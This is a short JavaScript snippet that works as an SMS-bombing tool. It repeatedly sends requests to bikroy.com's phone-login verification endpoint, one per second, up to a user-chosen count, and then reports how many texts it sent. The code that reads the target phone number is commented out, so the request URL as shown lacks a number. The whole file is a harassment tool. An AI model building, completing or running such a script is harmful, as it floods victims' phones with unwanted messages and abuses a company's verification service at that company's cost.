let limits;

function call() {
    // Uncomment following line to get phone number
    // let number = document.getElementById('phone').value;
    let api = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=";

    limits = document.querySelector(".limits").value;

    let x = 1;
    console.log(limits);

    function get() {
        if (x <= limits) {

            document.getElementById('cnt').innerText = x.toString();
            fetch(api, {mode: "no-cors"});
            x++;
            setTimeout(get, 1000);

        } else {
            document.getElementById('phone').value = " ";
            document.getElementById("limits").value = "10";
            alert((limits).toString() + " SMS sent!")
        }
    }

    get();

}
